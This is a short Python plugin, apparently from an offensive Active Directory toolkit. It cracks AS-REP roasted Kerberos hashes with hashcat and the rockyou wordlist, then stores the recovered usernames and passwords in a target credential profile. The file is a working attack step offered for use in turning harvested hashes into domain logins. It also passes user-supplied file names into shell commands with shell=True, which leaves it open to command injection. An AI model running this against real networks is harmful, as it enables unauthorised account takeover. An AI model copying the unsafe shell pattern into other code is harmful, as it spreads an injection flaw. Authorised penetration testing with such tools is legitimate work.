PROVIDES = ["creds"]
REQUIRES = ["asrep_hashes"]

def run(data, cred, args):
    import subprocess
    from core.loot import require_input
    from core import target
    import argparse

    # ---------------- INPUT (CLI OR LOOT) ----------------
    hashfile = require_input(data, args, "file", "asrep_hashes", "hash file")
    if not hashfile:
        return

    # ---------------- WORDLIST ----------------
    # allow: --wordlist OR fallback default
    wordlist = getattr(args, "wordlist", None)

    if not wordlist:
        # backward compatibility with old extra args
        if hasattr(args, "extra") and args.extra:
            wordlist = args.extra[0]
        else:
            wordlist = "/usr/share/wordlists/rockyou.txt"

    # ---------------- MODE ----------------
    mode = "18200"  # AS-REP

    # ---------------- RUN HASHCAT ----------------
    cmd = f"hashcat -m {mode} {hashfile} {wordlist}"

    print(f"[*] Running: {cmd}\n")

    subprocess.run(cmd, shell=True)

    # ---------------- SHOW RESULTS ----------------
    show_cmd = f"hashcat -m {mode} {hashfile} --show"

    result = subprocess.run(show_cmd, shell=True, capture_output=True, text=True)

    lines = result.stdout.splitlines()

    if not lines:
        print("[!] No cracked hashes yet")
        return

    print("\n[+] Cracked credentials:\n")

    for line in lines:
        try:
            hash_part, password = line.rsplit(":", 1)

            # extract user
            if "$krb5asrep$" in hash_part:
                user = hash_part.split("$")[3].split("@")[0]
            else:
                user = "unknown"

            print(f"[+] {user}:{password}")

            # ---------------- ADD TO PROFILE ----------------
            target.target_add_cred(
                argparse.Namespace(
                    user=user,
                    password=password,
                    hash=None,
                    aes=None,
                    ccache=None
                )
            )

        except Exception:
            print(f"[!] Failed to parse line: {line}")